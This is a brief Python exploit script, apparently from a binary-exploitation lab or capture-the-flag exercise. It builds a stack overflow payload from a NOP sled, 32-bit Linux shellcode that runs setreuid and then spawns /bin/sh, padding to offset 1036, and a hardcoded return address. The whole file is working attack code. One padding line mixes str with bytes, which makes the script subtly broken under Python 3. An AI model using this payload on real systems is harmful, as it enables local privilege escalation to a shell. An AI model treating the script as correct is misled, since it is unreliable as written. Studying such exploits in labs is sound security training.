from struct import pack

def p32(a):
    return pack("<I", a)

# setreuid(geteuid(), geteuid())
# execv("/bin//sh", argv)

# Shellcode in Python
shellcode = (
    b"\x6a\x31"  # push 0x31 (49)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (geteuid())

    b"\x89\xc3"  # mov ebx, eax (uid)
    b"\x89\xd9"  # mov ecx, ebx
    b"\x6a\x46"  # push 0x46 (70)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80, setreuid(geteuid(), geteuid())

    b"\x31\xd2"  # xor edx, edx
    b"\x52"      # push edx, which is \0
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"  # mov ebx, esp (now ebx contains: "/bin//sh",\x00)

    b"\x52"      # push edx (push NULL into stack)
    b"\x53"      # push ebx (push pathname)
    b"\x89\xe1"  # mov ecx, esp (ecx is argv)

    b"\xb0\x0b"  # mov al, 0x0b (11)
    b"\xcd\x80"  # int 0x80 (execv("/bin//sh", argv))

    # mv eax, 1         ; system call number (sys_exit)
    b"\x6a\x01"  # push 1
    b"\x58"      # pop eax (sys_exit)
    # int 0x80
    b"\xcd\x80"  # int 0x80 (exit())
)

ret_address = 0xbffff440
pos = 1036


payload = b'\x90' * 500 
payload += shellcode 
payload += '\x90' * (pos - len(payload))

payload += p32(ret_address)

print(payload)
